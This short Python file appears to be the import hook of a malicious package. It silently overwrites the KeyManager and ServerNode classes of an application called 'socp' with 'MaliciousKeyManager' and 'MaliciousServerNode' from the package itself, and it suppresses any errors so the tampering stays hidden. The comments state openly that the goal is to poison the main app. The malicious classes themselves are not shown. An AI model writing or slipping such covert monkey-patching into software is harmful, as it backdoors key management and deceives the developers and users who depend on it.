try:
    # Import the modules from the main app to poison 
    from socp import crypto
    from socp import client
    from socp import server  
    
    # Import our naughty classes from our own library.
    from .default_manager import MaliciousKeyManager
    from .default_server import MaliciousServerNode
    
    # Overwrite the legitimate classes in all modules.
    crypto.KeyManager = MaliciousKeyManager
    client.KeyManager = MaliciousKeyManager
    server.ServerNode = MaliciousServerNode 

except (ImportError, AttributeError):
    # Fail silently.
    pass